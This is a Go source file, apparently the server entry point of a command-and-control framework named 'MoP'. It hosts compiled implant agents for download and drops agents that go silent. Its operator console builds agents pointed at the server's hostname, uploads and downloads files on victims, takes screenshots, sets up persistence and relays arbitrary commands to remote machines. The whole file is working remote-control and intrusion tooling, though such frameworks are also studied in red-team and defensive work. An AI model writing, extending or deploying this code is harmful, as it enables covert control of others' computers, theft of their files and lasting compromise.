package main

import (
	"MoP/src/commands"
	"MoP/src/config"
	"MoP/src/controllers"
	"MoP/src/db"
	"MoP/src/middlewares"
	"MoP/src/router"
	"bufio"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

var (
	term          = "MoP> "
	selectedAgent = ""
)

func init() {
	db.CheckDB()
}

func main() {
	// carrega as configs
	config := config.Load()
	// carrega as rotas do pacote router
	r := router.Generate()
	// rota para o file server que conterá os agentes compilados
	r.PathPrefix("/downloads/").Handler(http.StripPrefix("/downloads/", http.FileServer(http.Dir("../agents"))))

	go killAgent()
	go cli()

	log.Fatal(http.ListenAndServe(fmt.Sprintf(":%d", config.Port), r))
}

// mata agente após 10 minutos sem comunicação
func killAgent() {
	for {
		ids := controllers.AgentsToKill()

		for _, id := range ids {
			resp := controllers.KillAgent(id)
			fmt.Println(resp)
		}

		time.Sleep(time.Duration(10) * time.Minute)
	}
}

// cli no terminal
func cli() {
	for {
		print(term)
		// le os comandos inputados
		command, _ := bufio.NewReader(os.Stdin).ReadString('\n')

		// separa o comando em partes
		slicedCommand := middlewares.SliceCommand(command)
		// captura a palavra chave do comando
		baseCommand := slicedCommand[0]

		if len(baseCommand) > 0 {
			if string(baseCommand[0]) == "!" {
				hostCommand := strings.Replace(command, "!", "", 1)
				if runtime.GOOS == "windows" {
					output, _ := exec.Command("powershell.exe", "/C", hostCommand).CombinedOutput()
					fmt.Println(string(output))
				} else {
					output, _ := exec.Command("/bin/sh", "-c", hostCommand).CombinedOutput()
					fmt.Println(string(output))
				}
			} else {
				switch baseCommand {
				case "help":
					fmt.Println(commands.Help())
				case "alias":
					// handler para as variações do comando show do pacote commands
					if selectedAgent != "" {
						commands.SetAlias(slicedCommand, selectedAgent)
					} else {
						fmt.Println("You need to select an agent!")
					}
				case "build":
					var agentName string
					agentName = "agent"
					if len(slicedCommand) > 1 {
						agentName = slicedCommand[1]
					}
					
					commands.BuildAgents(agentName, config.Load().Hostname)
				case "show":
					// handler para as variações do comando show do pacote commands
					commands.ShowHandler(slicedCommand, selectedAgent)

				case "select":
					// seleciona um agente com a validação do pacote commands
					selectedAgent = commands.SelectHandler(slicedCommand)
					if selectedAgent != "" {
						term = selectedAgent + "@MoP# "
					} else {
						term = "MoP> "
					}
				case "upload":
					if selectedAgent != "" {
						commands.UploadFile(selectedAgent, slicedCommand)
						commands.CommandHandler(selectedAgent, command)
					} else {
						fmt.Println("You need to select an agent!")
					}
				case "download":
					if selectedAgent != "" {
						commands.DownloadFile(selectedAgent, slicedCommand)
						commands.CommandHandler(selectedAgent, command)
					} else {
						fmt.Println("You need to select an agent!")
					}
				case "screenshot":
					if selectedAgent != "" {
						commands.TakeScrenshot(selectedAgent, slicedCommand)
						commands.CommandHandler(selectedAgent, command)
					} else {
						fmt.Println("You need to select an agent!")
					}
				case "persist":
					if selectedAgent != "" {
						commands.CommandHandler(selectedAgent, command)
					} else {
						fmt.Println("You need to select an agent!")
					}
				default:
					if selectedAgent != "" {
						commands.CommandHandler(selectedAgent, command)
					} else {
						fmt.Println("You need to select an agent!")
					}

				}
			}
		}

	}

}
